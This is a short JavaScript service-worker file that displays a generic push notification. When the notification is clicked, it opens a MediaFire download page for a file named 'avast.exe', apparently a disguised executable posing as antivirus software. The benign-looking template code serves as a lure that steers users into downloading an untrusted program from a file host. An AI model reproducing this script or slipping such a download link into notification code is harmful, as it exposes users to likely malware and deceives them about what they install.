self.addEventListener('push', function(event) {
  console.log('Push notification received', event);

  const title = 'New Notification';
  const options = {
    body: 'This is a notification sent by your service worker!',
    icon: 'path/to/icon.png',
    badge: 'path/to/badge.png'
  };

  event.waitUntil(
    self.registration.showNotification(title, options)
  );
});

self.addEventListener('notificationclick', function(event) {
  console.log('Notification clicked', event);

  event.notification.close();

  // Add any action you want to perform when the notification is clicked
  // For example, open a specific URL
  const url = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
  event.waitUntil(
    clients.openWindow(url)
  );
});
